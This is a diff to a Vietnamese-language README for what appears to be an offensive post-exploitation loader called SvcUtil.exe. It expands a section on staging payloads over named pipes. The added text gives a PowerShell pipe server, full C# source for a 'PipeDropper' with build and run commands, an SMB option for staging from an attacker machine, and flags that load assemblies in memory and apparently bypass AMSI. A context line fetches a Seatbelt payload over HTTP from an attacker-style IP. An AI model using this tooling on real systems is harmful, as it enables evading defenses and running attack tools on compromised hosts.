@@ -413,21 +413,62 @@ SvcUtil.exe --exec-asm --stage-http http://10.10.14.1/seatbelt.b64
 SvcUtil.exe --exec-asm --stage-pipe mypipe
 ```
 
-**Named pipe staging** — SvcUtil kết nối như pipe client. Cần có process khác tạo pipe server trước:
+**Named pipe staging** — SvcUtil kết nối như pipe client (`NamedPipeClientStream`). Cần có một pipe server chạy trước để phục vụ payload bytes. Có thể tạo pipe server bằng nhiều cách:
+
+**Cách 1: PowerShell (đã có shell trên target)**
 
 ```powershell
-# Trên target — process đã có sẵn (dropper, implant, PowerShell) tạo pipe server:
+$bytes = [IO.File]::ReadAllBytes("C:\staging\Seatbelt.exe")
 $pipe = New-Object IO.Pipes.NamedPipeServerStream("mypipe", [IO.Pipes.PipeDirection]::Out)
 $pipe.WaitForConnection()
-$bytes = [IO.File]::ReadAllBytes("C:\staging\Seatbelt.exe")
 $pipe.Write($bytes, 0, $bytes.Length)
 $pipe.Close()
-
-# SvcUtil đọc từ pipe và chạy assembly
-# SvcUtil.exe --stage-pipe mypipe --exec-asm --amsi -- -group=all
 ```
 
-Pipe cũng hỗ trợ remote qua SMB: `--stage-pipe fileserver/mypipe` kết nối đến `\\fileserver\pipe\mypipe`.
+**Cách 2: C# dropper (compile riêng, chạy trước SvcUtil)**
+
+Lưu thành `PipeDropper.cs`, build bằng csc.exe:
+
+```csharp
+using System;
+using System.IO;
+using System.IO.Pipes;
+
+class PipeDropper
+{
+    static void Main(string[] args)
+    {
+        if (args.Length < 2)
+        {
+            Console.WriteLine("Usage: PipeDropper.exe <payload_file> <pipe_name>");
+            return;
+        }
+        byte[] payload = File.ReadAllBytes(args[0]);
+        using (var pipe = new NamedPipeServerStream(args[1], PipeDirection.Out))
+        {
+            Console.WriteLine("[*] Waiting for client on \\\\.\\pipe\\" + args[1]);
+            pipe.WaitForConnection();
+            pipe.Write(payload, 0, payload.Length);
+            Console.WriteLine("[+] Sent " + payload.Length + " bytes");
+        }
+    }
+}
+```
+
+```bash
+# Build
+csc.exe /out:PipeDropper.exe PipeDropper.cs
+
+# Chạy dropper (đợi SvcUtil kết nối)
+PipeDropper.exe Seatbelt.exe mypipe
+
+# Cửa sổ khác — SvcUtil đọc từ pipe
+SvcUtil.exe --stage-pipe mypipe --exec-asm --amsi -- -group=all
+```
+
+**Cách 3: Remote qua SMB (từ attacker)**
+
+`--stage-pipe fileserver/mypipe` kết nối đến `\\fileserver\pipe\mypipe`, cho phép stage payload từ máy khác trong cùng mạng mà không cần HTTP.
 
 **Passing arguments to the assembly** — use `--` to separate SvcUtil flags from assembly arguments:
 
